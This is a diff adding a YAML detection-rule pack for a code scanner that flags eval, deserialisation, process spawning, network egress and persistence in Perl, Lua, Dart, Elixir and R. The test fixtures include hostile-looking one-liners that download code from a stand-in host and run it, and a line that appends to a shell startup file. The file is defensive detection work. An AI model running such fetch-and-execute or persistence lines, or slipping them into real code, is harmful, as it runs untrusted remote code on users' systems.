@@ -1,0 +1,863 @@
+pack:
+  id: cordon.capabilities.perl-lua-dart-elixir-r
+  version: 0.2.0
+  license: Apache-2.0
+  source: cordon-builtin
+  description: >
+    Capability primitives for Perl, Lua, Dart, Elixir and R (design gap G4). The language-agnostic
+    packs already give these languages decode, egress, credential, reconnaissance, delay,
+    anti-analysis, mining and wallet signals; this pack adds what only each language's own idioms
+    can show: evaluating a string, starting a process, deserialising objects, expanding a
+    compressed payload, writing a persistence location, and running what was just downloaded.
+    It defines the same primitive names every other pack defines, so each language inherits the
+    behavioural rules in cordon.composites unchanged.
+
+    Dart has no string evaluator and no native object deserialiser, so it gets no `execute` from a
+    string and no `deserialize` rule here: reporting one would be a claim about a capability the
+    language does not have. Loading code from a URI (`Isolate.spawnUri`) is its `execute`.
+
+rules:
+  # ---------------------------------------------------------------------
+  # Perl
+  # ---------------------------------------------------------------------
+  - id: CAP.PL.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 or packed data at runtime.
+    remediation: No action for this signal alone.
+    languages: [perl]
+    match:
+      kind: regex
+      patterns:
+        - '\bdecode_base64\s*\('
+        - '\bunpack\s*\(\s*["'']m'
+        - '\bpack\s*\(\s*["'']H\*["'']'
+    tests:
+      positive:
+        - "my $raw = decode_base64($blob);"
+        - "my $raw = unpack('m', $blob);"
+      negative:
+        - "my $out = encode_base64($data);"
+        - "print \"done\\n\";"
+
+  - id: CAP.PL.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [perl]
+    match:
+      kind: regex
+      patterns:
+        - '\bIO::Uncompress::(?:Gunzip|Inflate|Bunzip2|AnyUncompress)\b'
+        - '\b(?:uncompress|memGunzip)\s*\('
+    tests:
+      positive:
+        - "use IO::Uncompress::Gunzip qw(gunzip);"
+        - "my $raw = uncompress($blob);"
+      negative:
+        - "my $z = compress($data);"
+
+  - id: CAP.PL.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Evaluates code from a string
+    message: >
+      This file evaluates a string as Perl. `eval { ... }` is exception handling and is not
+      matched; `eval $string` is code arriving as data.
+    remediation: Remove the string evaluation. Code should not arrive as a string.
+    languages: [perl]
+    match:
+      kind: regex
+      patterns:
+        - '\beval\s*\(\s*\$'
+        - '\beval\s+\$'
+        - '\beval\s+(?:"|qq\s*[{(\[/])'
+    tests:
+      positive:
+        - "eval $code;"
+        - "eval($payload);"
+        - "eval qq{$snippet};"
+      negative:
+        - "eval { risky() }; warn $@ if $@;"
+        - "my $result = evaluate($x);"
+
+  - id: CAP.PL.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns a serialised byte stream back into live objects
+    message: >
+      Storable's thaw and retrieve rebuild blessed objects from the stream, which is code execution
+      on untrusted input.
+    remediation: Use a data-only format such as JSON for anything that crosses a trust boundary.
+    languages: [perl]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - '\bStorable::(?:thaw|retrieve|fd_retrieve)\b'
+        - '\b(?:thaw|fd_retrieve)\s*\('
+    tests:
+      positive:
+        - "my $obj = Storable::thaw($frozen);"
+        - "my $obj = thaw($bytes);"
+        - "my $obj = thaw(decode_base64($blob));"
+      negative:
+        - "my $data = decode_json($text);"
+        - "use Storable qw(thaw);"
+
+  - id: CAP.PL.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process or subshell
+    message: This file starts an external process.
+    remediation: Pass an argument list rather than a command string.
+    languages: [perl]
+    match:
+      kind: regex
+      patterns:
+        - '\bsystem\s*\('
+        - '\bexec\s*\('
+        - '\bqx\s*[{(\[/]'
+        - '\bopen\s*\([^)\n]{0,80}["'']\s*-?\|'
+        - '\bopen\s*\([^)\n]{0,80}\|\s*["'']'
+    tests:
+      positive:
+        - "system('make', 'install');"
+        - "my $out = qx{uname -a};"
+        - "open(my $fh, '-|', 'ls');"
+        - "open(PIPE, \"ls |\");"
+      negative:
+        - "open(my $fh, '<', $path) or die;"
+        - "my $sys = $config->{system};"
+
+  - id: CAP.PL.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      The result of a network read is handed straight to eval or a shell: what runs is whatever the
+      remote host served at that moment.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [perl]
+    match:
+      kind: regex
+      patterns:
+        - '\beval\s*\(?\s*(?:LWP::Simple::)?get\s*\(\s*["''$]'
+        - '\beval\s*\(?\s*\$\w+\s*->\s*(?:get|request)\s*\([^)\n]{0,120}\)\s*->\s*(?:content|decoded_content)'
+        - '\bsystem\s*\(?\s*(?:LWP::Simple::)?get\s*\('
+    tests:
+      positive:
+        - "eval(get('http://example.test/x.pl'));"
+        - "eval LWP::Simple::get($url);"
+        - "eval $ua->get($url)->decoded_content;"
+      negative:
+        - "my $page = get($url);"
+        - "eval { $ua->get($url) };"
+
+  - id: CAP.PL.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [perl]
+    match:
+      kind: regex
+      patterns:
+        - '\bLWP::(?:UserAgent|Simple)\b'
+        - '\bHTTP::Tiny\b'
+        - '\bIO::Socket::(?:INET6?|IP|SSL)\b'
+        - '\bNet::(?:HTTP|HTTPS|FTP)\b'
+        # LWP::Simple exports these, so after `use LWP::Simple` the call is the only trace of the
+        # network: `eval get('https://...')` names no module on the line.
+        - '(?<![\w.>:$-])(?:get|getstore|getprint|mirror)\s*\(\s*["'']https?://'
+    tests:
+      positive:
+        - "my $ua = LWP::UserAgent->new;"
+        - "my $page = get('https://example.test/x');"
+        - "my $s = IO::Socket::INET->new(PeerAddr => $host);"
+      negative:
+        - "use strict;"
+
+  # ---------------------------------------------------------------------
+  # Lua
+  # ---------------------------------------------------------------------
+  - id: CAP.LUA.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [lua]
+    match:
+      kind: regex
+      patterns:
+        - '\bmime\s*\.\s*unb64\s*\('
+        - '\b(?:base64|b64)\s*\.\s*(?:decode|dec)\s*\('
+    tests:
+      positive:
+        - "local raw = mime.unb64(blob)"
+        - "local raw = base64.decode(blob)"
+      negative:
+        - "local enc = base64.encode(data)"
+
+  - id: CAP.LUA.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: This file decompresses data.
+    remediation: No action for this signal alone.
+    languages: [lua]
+    match:
+      kind: regex
+      patterns:
+        - '\bzlib\s*\.\s*(?:inflate|decompress)\s*\('
+        - '\b[Ll]ib[Dd]eflate\s*:\s*Decompress'
+    tests:
+      positive:
+        - "local raw = zlib.inflate()(blob)"
+        - "local raw = LibDeflate:DecompressDeflate(blob)"
+      negative:
+        - "local z = zlib.deflate()(data)"
+
+  - id: CAP.LUA.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Evaluates code from a string
+    message: This file compiles a string into a Lua function, which runs whatever the string holds.
+    remediation: Remove the evaluation. Code should not arrive as a string.
+    languages: [lua]
+    match:
+      kind: regex
+      patterns:
+        - '\bloadstring\s*\('
+        - '(?<![.:\w])load\s*\(\s*(?!["'']\s*\)|\)|function\b)'
+    tests:
+      positive:
+        - "local f = loadstring(code)"
+        - "local f = load(payload)"
+      negative:
+        - "local cfg = config.load(path)"
+        - "local mod = require('json')"
+
+  - id: CAP.LUA.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns a serialised byte stream back into live objects
+    message: >
+      These deserialisers rebuild objects by running code or invoking registered constructors, so
+      a crafted stream executes.
+    remediation: Use a data-only format, or serpent.load with safe = true.
+    languages: [lua]
+    match:
+      kind: regex
+      patterns:
+        - '\bbinser\s*\.\s*deserialize\s*\('
+        - '\bserpent\s*\.\s*load\s*\([^)\n]{0,120}safe\s*=\s*false'
+        - '\bloadstring\s*\(\s*["'']return\s'
+    tests:
+      positive:
+        - "local obj = binser.deserialize(bytes)"
+        - "local ok, t = serpent.load(text, {safe = false})"
+      negative:
+        - "local ok, t = serpent.load(text)"
+        - "local t = json.decode(text)"
+
+  - id: CAP.LUA.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process or subshell
+    message: This file starts an external process.
+    remediation: Avoid shelling out from a library.
+    languages: [lua]
+    match:
+      kind: regex
+      patterns:
+        - '\bos\s*\.\s*execute\s*\('
+        - '\bio\s*\.\s*popen\s*\('
+    tests:
+      positive:
+        - "os.execute('make')"
+        - "local p = io.popen('uname -a')"
+      negative:
+        - "local f = io.open(path, 'r')"
+
+  - id: CAP.LUA.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      A network read is compiled and run in one expression - `loadstring(game:HttpGet(url))()` is
+      the commonest loader in malicious Lua.
+    remediation: Verify a downloaded script against a known digest before anything runs it.
+    languages: [lua]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:loadstring|load)\s*\(\s*(?:game\s*:\s*HttpGet(?:Async)?|(?:socket\.)?http\s*\.\s*request|https\s*\.\s*request)\s*\('
+    tests:
+      positive:
+        - "loadstring(game:HttpGet('https://example.test/x.lua'))()"
+        - "load(http.request(url))()"
+      negative:
+        - "local body = http.request(url)"
+        - "local f = loadstring(code)"
+
+  - id: CAP.LUA.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [lua]
+    match:
+      kind: regex
+      patterns:
+        - '\bsocket\s*\.\s*(?:http|tcp|udp|connect)\b'
+        - '\bssl\s*\.\s*https\b'
+        - '\bhttp\s*\.\s*request\s*\('
+        - '\bgame\s*:\s*HttpGet(?:Async)?\s*\('
+    tests:
+      positive:
+        - "local http = require('socket.http')"
+        - "local body = game:HttpGet(url)"
+      negative:
+        - "local f = io.open(path)"
+
+  # ---------------------------------------------------------------------
+  # Dart
+  # ---------------------------------------------------------------------
+  - id: CAP.DART.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [dart]
+    match:
+      kind: regex
+      patterns:
+        - '\bbase64(?:Url)?\s*\.\s*decode\s*\('
+        - '\bbase64Decode\s*\('
+    tests:
+      positive:
+        - "final raw = base64Decode(blob);"
+        - "final raw = base64.decode(blob);"
+      negative:
+        - "final enc = base64Encode(bytes);"
+
+  - id: CAP.DART.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: This file decompresses data.
+    remediation: No action for this signal alone.
+    languages: [dart]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:gzip|zlib)\s*\.\s*decode\s*\('
+        - '\b(?:GZipDecoder|ZLibDecoder)\s*\('
+    tests:
+      positive:
+        - "final raw = gzip.decode(bytes);"
+        - "final raw = ZLibDecoder().convert(bytes);"
+      negative:
+        - "final z = gzip.encode(bytes);"
+
+  - id: CAP.DART.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Loads and runs code from a URI
+    message: >
+      Dart cannot evaluate a string, but `Isolate.spawnUri` loads and runs a Dart program from a
+      location chosen at runtime, which is the same capability.
+    remediation: Run only code that ships with the package.
+    languages: [dart]
+    match:
+      kind: regex
+      patterns:
+        - '\bIsolate\s*\.\s*spawnUri\s*\('
+    tests:
+      positive:
+        - "await Isolate.spawnUri(uri, [], null);"
+      negative:
+        - "await Isolate.spawn(worker, message);"
+
+  - id: CAP.DART.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process
+    message: This file starts an external process.
+    remediation: Avoid shelling out from a package.
+    languages: [dart]
+    match:
+      kind: regex
+      patterns:
+        - '\bProcess\s*\.\s*(?:run|runSync|start)\s*\('
+    tests:
+      positive:
+        - "await Process.run('git', ['status']);"
+      negative:
+        - "final p = processor.run(job);"
+
+  - id: CAP.DART.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: A program at a remote URL is loaded and run, or a download is handed straight to a process.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [dart]
+    match:
+      kind: regex
+      patterns:
+        - '\bIsolate\s*\.\s*spawnUri\s*\(\s*Uri\s*\.\s*parse\s*\(\s*["'']https?:'
+        - '\bProcess\s*\.\s*(?:run|start)\s*\([^)\n]{0,120}\b(?:http\s*\.\s*get|HttpClient)\b'
+    tests:
+      positive:
+        - "await Isolate.spawnUri(Uri.parse('https://example.test/x.dart'), [], null);"
+      negative:
+        - "await Isolate.spawnUri(Uri.file(path), [], null);"
+
+  - id: CAP.DART.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [dart]
+    match:
+      kind: regex
+      patterns:
+        - '\bHttpClient\s*\(\s*\)'
+        - '\bhttp\s*\.\s*(?:get|post|put|read)\s*\('
+        - '\b(?:Socket|RawSocket|SecureSocket)\s*\.\s*connect\s*\('
+    tests:
+      positive:
+        - "final r = await http.post(uri, body: data);"
+        - "final s = await Socket.connect(host, 443);"
+      negative:
+        - "final f = File(path);"
+
+  # ---------------------------------------------------------------------
+  # Elixir
+  # ---------------------------------------------------------------------
+  - id: CAP.EX.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 or hex data at runtime.
+    remediation: No action for this signal alone.
+    languages: [elixir]
+    match:
+      kind: regex
+      patterns:
+        - '\bBase\s*\.\s*(?:decode64|url_decode64|decode16|decode32|hex_decode32)\b'
+    tests:
+      positive:
+        - "raw = Base.decode64!(blob)"
+      negative:
+        - "enc = Base.encode64(data)"
+
+  - id: CAP.EX.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: This file decompresses data.
+    remediation: No action for this signal alone.
+    languages: [elixir]
+    match:
+      kind: regex
+      patterns:
+        - ':zlib\s*\.\s*(?:uncompress|gunzip|unzip|inflate)\b'
+    tests:
+      positive:
+        - "raw = :zlib.gunzip(blob)"
+      negative:
+        - "z = :zlib.gzip(data)"
+
+  - id: CAP.EX.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Evaluates code from a string
+    message: This file compiles or evaluates a string as Elixir code.
+    remediation: Remove the evaluation. Code should not arrive as a string.
+    languages: [elixir]
+    match:
+      kind: regex
+      patterns:
+        - '\bCode\s*\.\s*(?:eval_string|eval_quoted|compile_string|eval_file|string_to_quoted!?)\b'
+    tests:
+      positive:
+        - "{result, _} = Code.eval_string(source)"
+      negative:
+        - "Code.ensure_loaded?(Mod)"
+
+  - id: CAP.EX.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns external terms back into live values without the safe option
+    message: >
+      `:erlang.binary_to_term/1` without `[:safe]` creates atoms and function references from the
+      stream: on untrusted input that is atom exhaustion and, with funs, code that runs.
+    remediation: Pass [:safe], or use a data-only format.
+    languages: [elixir]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - ':erlang\s*\.\s*binary_to_term\s*\((?![^)\n]{0,120}:safe)'
+        - '\bPlug\.Crypto\.non_executable_binary_to_term\b(?!.*:safe)'
+    tests:
+      positive:
+        - "term = :erlang.binary_to_term(bytes)"
+      negative:
+        - "term = :erlang.binary_to_term(bytes, [:safe])"
+
+  - id: CAP.EX.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process or subshell
+    message: This file starts an external OS process.
+    remediation: Avoid shelling out from a library.
+    languages: [elixir]
+    match:
+      kind: regex
+      patterns:
+        - '\bSystem\s*\.\s*(?:cmd|shell)\s*\('
+        - ':os\s*\.\s*cmd\b'
+        - '\bPort\s*\.\s*open\s*\('
+    tests:
+      positive:
+        - "System.cmd(\"make\", [\"build\"])"
+        - ":os.cmd('uname -a')"
+      negative:
+        - "System.get_env(\"PORT\")"
+
+  - id: CAP.EX.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: The body of an HTTP response is evaluated as code in one expression.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [elixir]
+    match:
+      kind: regex
+      patterns:
+        - '\bCode\s*\.\s*eval_string\s*\(\s*(?:HTTPoison|Req|Tesla|:httpc)\b'
+        - '\bCode\s*\.\s*eval_string\s*\(\s*\w+\s*\.\s*body\b'
+    tests:
+      positive:
+        - "Code.eval_string(HTTPoison.get!(url).body)"
+        - "Code.eval_string(resp.body)"
+      negative:
+        - "Code.eval_string(\"1 + 1\")"
+
+  - id: CAP.EX.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [elixir]
+    match:
+      kind: regex
+      patterns:
+        - '\bHTTPoison\s*\.\s*\w+'
+        - '\bReq\s*\.\s*(?:get|post|put|request)\b'
+        - ':httpc\s*\.\s*request\b'
+        - ':gen_tcp\s*\.\s*connect\b'
+        - '\bMint\s*\.\s*HTTP\s*\.\s*connect\b'
+    tests:
+      positive:
+        - "HTTPoison.post(url, body)"
+        - ":gen_tcp.connect(host, 443, [])"
+      negative:
+        - "File.read!(path)"
+
+  # ---------------------------------------------------------------------
+  # R
+  # ---------------------------------------------------------------------
+  - id: CAP.R.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [r]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:base64enc::)?base64decode\s*\('
+        - '\b(?:jsonlite::)?base64_dec\s*\('
+        - '\bopenssl::base64_decode\s*\('
+    tests:
+      positive:
+        - "raw <- base64enc::base64decode(blob)"
+        - "raw <- openssl::base64_decode(blob)"
+      negative:
+        - "enc <- base64enc::base64encode(data)"
+
+  - id: CAP.R.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: This file decompresses data held in memory or read from a connection.
+    remediation: No action for this signal alone.
+    languages: [r]
+    match:
+      kind: regex
+      patterns:
+        - '\bmemDecompress\s*\('
+        - '\bgzcon\s*\('
+    tests:
+      positive:
+        - "raw <- memDecompress(blob, 'gzip')"
+        - "con <- gzcon(url(u))"
+      negative:
+        - "z <- memCompress(data, 'gzip')"
+
+  - id: CAP.R.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Evaluates code from a string
+    message: This file parses a string as R and evaluates it.
+    remediation: Remove the evaluation. Code should not arrive as a string.
+    languages: [r]
+    match:
+      kind: regex
+      patterns:
+        - '\beval\s*\(\s*(?:parse\s*\(\s*text\s*=|str2lang\s*\(|str2expression\s*\()'
+        - '\beval\s*\(\s*parse\s*\(\s*[a-z]\w*\s*\)'
+    tests:
+      positive:
+        - "eval(parse(text = code))"
+        - "eval(str2lang(expr))"
+      negative:
+        - "x <- evaluate_model(fit)"
+        - "eval(quote(x + 1))"
+
+  - id: CAP.R.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns a serialised stream back into live objects
+    message: >
+      unserialize, readRDS and load rebuild R objects, including promises that evaluate on access:
+      a crafted .rds file runs code when it is read (CVE-2024-27322).
+    remediation: Read untrusted data in a data-only format such as CSV or JSON.
+    languages: [r]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - '\bunserialize\s*\('
+        - '\breadRDS\s*\(\s*(?:url|gzcon|rawConnection)\s*\('
+        - '\bload\s*\(\s*(?:url|gzcon|rawConnection)\s*\('
+    tests:
+      positive:
+        - "obj <- unserialize(bytes)"
+        - "obj <- readRDS(url(u))"
+      negative:
+        - "df <- read.csv(path)"
+
+  - id: CAP.R.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process or subshell
+    message: This file starts an external process.
+    remediation: Avoid shelling out from a package.
+    languages: [r]
+    match:
+      kind: regex
+      patterns:
+        - '\bsystem2?\s*\('
+        - '\bshell\s*\('
+        - '\bprocessx::(?:run|process)\b'
+        - '\bpipe\s*\(\s*["'']'
+    tests:
+      positive:
+        - "system('make')"
+        - "system2('git', c('status'))"
+      negative:
+        - "x <- system.file('extdata', package = 'pkg')"
+
+  - id: CAP.R.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: R code fetched over the network is sourced or evaluated as it arrives.
+    remediation: Verify a downloaded script against a known digest before anything runs it.
+    languages: [r]
+    match:
+      kind: regex
+      patterns:
+        - '\bsource\s*\(\s*(?:["'']https?://|url\s*\()'
+        - '\beval\s*\(\s*parse\s*\(\s*(?:url\s*\(|text\s*=\s*(?:readLines\s*\(\s*(?:url|["'']https?)|httr::content|curl::))'
+    tests:
+      positive:
+        - "source('https://example.test/install.R')"
+        - "eval(parse(url(u)))"
+      negative:
+        - "source('R/helpers.R')"
+
+  - id: CAP.R.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [r]
+    match:
+      kind: regex
+      patterns:
+        - '\bhttr2?::(?:GET|POST|PUT|request|req_perform)\b'
+        - '\bcurl::curl(?:_fetch_memory|_fetch_disk|_download)?\s*\('
+        - '\bdownload\.file\s*\('
+        - '\bsocketConnection\s*\('
+        - '\burl\s*\(\s*["'']https?://'
+    tests:
+      positive:
+        - "httr::POST(u, body = payload)"
+        - "download.file(u, dest)"
+        - "con <- url('https://example.test/data')"
+      negative:
+        - "read.csv(path)"
+
+  # ---------------------------------------------------------------------
+  # All five: persistence locations
+  # ---------------------------------------------------------------------
+  - id: CAP.SCRIPT.PERSIST.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: persist
+    title: Writes to a location that survives a restart
+    message: >
+      This file names a shell startup file, a scheduler or a service location - or R's own startup
+      file, which runs in every later R session.
+    remediation: Confirm this is a deliberate installer action.
+    languages: [perl, lua, dart, elixir, r]
+    match:
+      kind: regex
+      patterns:
+        - '\.bashrc|\.bash_profile|\.zshrc|\.profile\b'
+        - 'crontab|/etc/cron'
+        - 'systemd/system|LaunchAgents|LaunchDaemons'
+        - '(?:cat|write|writeLines)\s*\([^\n]{0,160}\.Rprofile'
+    tests:
+      positive:
+        - "open(my $fh, '>>', \"$ENV{HOME}/.bashrc\");"
+        - "writeLines(line, file.path('~', '.Rprofile'))"
+      negative:
+        - "print('started')"
